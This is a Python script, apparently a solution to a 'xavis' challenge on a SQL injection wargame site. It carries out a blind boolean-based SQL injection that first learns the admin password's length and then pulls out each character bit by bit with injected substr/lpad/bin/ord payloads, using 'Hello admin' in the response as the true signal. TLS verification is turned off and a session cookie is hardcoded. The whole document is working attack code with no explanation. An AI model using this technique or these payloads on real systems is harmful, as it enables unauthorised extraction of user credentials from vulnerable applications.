import requests
 
requests.packages.urllib3.disable_warnings()
sess = requests.session()
URL = 'https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php?pw='
headers = {'Cookie': 'PHPSESSID=2jmdje149iheon8es94327lllt'}
 
# get length of column  =============
 
passwordLen = 0
 
for i in range(1, 100):
  payload = "' or length(pw)=" + str(i) + " and id='admin"
  res     = sess.get(url=URL+payload, headers=headers, verify=False)
 
  if 'Hello admin' in res.text:
    passwordLen = i
    break
  else:
    pass
 
print('[=] Find Password Length : %d' % passwordLen)
 
 
bitLen   = 16
Password = ''
 
for j in range(1, passwordLen+1):
 
  bit = ''
 
  for i in range(1, bitLen+1):
    payload = "' or id='admin' and substr(lpad(bin(ord(substr(pw,{},1))),{},0),{},1)=1%23".format(j, bitLen, i)
    res     = sess.get(url=URL+payload, headers=headers, verify=False)
 
    if 'Hello admin' in res.text:
      # true!!
      bit += '1'
    else:
      # false!!
      bit += '0'

  Password += chr(int(bit, 2))
  print('bit :' + str(bit))
  print('[=] Find Password(count %02d) : %s (bit : %s) (hex : %s)' % (j, chr(int(bit, 2)), bit, hex(int(bit, 2))[2:]))
 
 
print('[=] Find Password : %s' % Password)
